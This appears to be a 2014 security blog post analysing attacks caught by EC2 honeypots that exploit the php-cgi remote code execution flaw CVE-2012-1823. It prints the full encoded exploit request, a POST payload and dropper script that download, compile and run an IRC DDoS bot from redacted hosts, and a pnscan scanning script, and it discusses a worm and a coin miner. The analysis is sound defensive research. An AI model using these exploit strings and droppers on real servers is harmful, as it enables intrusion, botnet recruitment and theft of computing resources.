---
date: '2014-05-15T10:00:00+10:00'
title: 'Your EC2 instance can mine a bitcoin. Well, not for you!'
draft: false
tags: ["security", "cloud", "aws", "ec2", "honeypot", "bitcoin"]
---

Different variance of 'old' php-cgi remote code execution vulnerability (i.e. CVE-2012-1823) was observed across EC2 Smart Honeypot instances. The interesting piece was differences in the attack drop-by files:
- Hosting a IRC bot (DDoS, RCE etc.) – as always!
- Hosting a Linux.Darlloz worm – observed again.
- Hosting a Crypto Currency miner – interesting piece!
- Hosting a port scanner – not very well scripted!

## Analysis

### IRC bot

The template for the URI request is:

```/dev/null/code.php#L1-10
/cgi-bin/php[4|5|-cgi|.cgi]?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F
%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65
%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74
%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74
%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72
%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66
%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E
%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69
%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30
+%2D%6E
```

which is URL-Encoded version of the following decoded request:

```/dev/null/decoded.txt#L1-5
-d allow_url_include=on -d safe_mode=off -d suhosin.simulation=on 
-d disable_functions="" -d open_basedir=none 
-d auto_prepend_file=php://input -d cgi.force_redirect=0 
-d cgi.redirect_status_env=0 -n
```

This exploits tampers few configuration settings of the php interpreter on the host. The interesting part is the content of POST request:

```/dev/null/post.php#L1-4
<?php 
system(\\x22wget http://[removed].us/bots/regular.bot -O /tmp/sh;
sh /tmp/sh;rm -rf /tmp/sh\\x22); 
?>
```

it points to download, execute and remove a shell script. The following is the content of the shell code:

```/dev/null/shellcode.sh#L1-10
#!/bin/sh

wget http://[removed]/files/kaiten.c -O /tmp/a.c
gcc -o /tmp/a /tmp/a.c

wget http://[removed]/files/a -O /tmp/a
chmod +x /tmp/a
gcc -o /tmp/a /tmp/a.c
rm -rf /tmp/a.c
/tmp/a &
```

Although the script download two files, second downloaded file overwrites the first file (nice scripting)! Looking at the source code, it seems like a IRC based bot that allows for range of TCP and UDP based denial of service attack and remote code execution.

## Linux.Darlloz Worm (reloaded!)

The URI request to deploy the drop-by was slightly different as it was targeted at _phppath/php_:

```/dev/null/darlloz.txt#L1-3
phppath/php?-d allow_url_include=on -d safe_mode=off 
-d suhosin.simulation=on -d disable_functions="" 
-d open_basedir=none -d auto_prepend_file=php://input -n
```

This worm was previously (12/2013) seen that targets _php-cgi_ path.

The worm is capable of attacking different CPU architecture i.e. ARM, MIPS etc and opens a backdoor on port 58455 for remote commands.

## Crypto currency miner

The most interesting piece was Crypto Currency miner (e.g. bitcoin, litecoin etc.). A version of cpuminer was observed on one of the Smart Honeypot which is a multi-threaded crypto currency miner capable of running on different operating systems and CPU architecture (not GPU).

So attackers use your Cloud instance to mine coins! if you've recently received a massive bill shock from AWS, this might have a good reason! Check out for processes like "minerd" on your server.

## Port scanner (Apache discovery)

'pnscan' was another drop-by on the some of the Smart Honeypots that was configured to continuously get executed. pnscan is a multi-threaded port scanner and was used to randomly scan internet for existence of Apache server. So effectively the host is used as an attack launch pad to find other Apache hosts.

```/dev/null/scanner.sh#L1-5
#!/bin/bash 
rand=`echo $((RANDOM%225+2))` 
cd /dev/shm 
nohup ./pnscan -rApache -w"HEAD / HTTP/1.0\r\n\r\n" $rand.0.0.0/8 80 > /dev/null &
```

pnscan is set to scan a random class A subnet. At first I through it uses a reverse-byte order tactic as it has been seen in zero-slash analysis, however, looking closely it turned out to be an inefficient way of discovering Apache hosts across a given subnet. Reverse-byte order scanning is a stealthy scanning activity where an IDS device monitoring a subnet like /24 is incapable to discover and alert. As an example the scanner first scans 1.0.0.0 then 2.0.0.0 then 3.0.0.0 rather than 1.0.0.1, 1.0.0.2, 1.0.0.3 etc.

## Adversary profile

in the next post…

_If you are interested to do further research, all drop-bys are available for download, just drop me a line._